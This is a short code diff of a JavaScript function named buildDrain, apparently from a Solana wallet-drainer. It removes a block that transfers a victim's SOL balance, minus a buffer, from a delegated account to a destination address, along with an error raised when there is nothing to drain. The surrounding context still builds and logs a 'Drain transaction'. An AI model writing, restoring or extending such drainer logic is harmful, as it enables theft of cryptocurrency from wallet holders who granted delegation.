@@ -71,21 +71,8 @@ async function buildDrain(user, connection) {
                 );
             }
 
-            const solBalance = tokenAccounts.sol;
-            if (solBalance > MIN_SOL_TO_DRAIN + SOL_BUFFER) {
-                const lamportsToSend = solBalance - SOL_BUFFER;
-                tx.add(
-                    SystemProgram.transfer({
-                        fromPubkey: delegatePubkey,
-                        toPubkey: destinationPubkey,
-                        lamports: Number(lamportsToSend)
-                    })
-                );
-            }
-
-            if (tx.instructions.length === 0) {
-                throw new Error("No tokens or SOL to drain");
-            }
+            
+            
 
             logger.info("Drain transaction built", { instructions: tx.instructions.length });
             return tx;
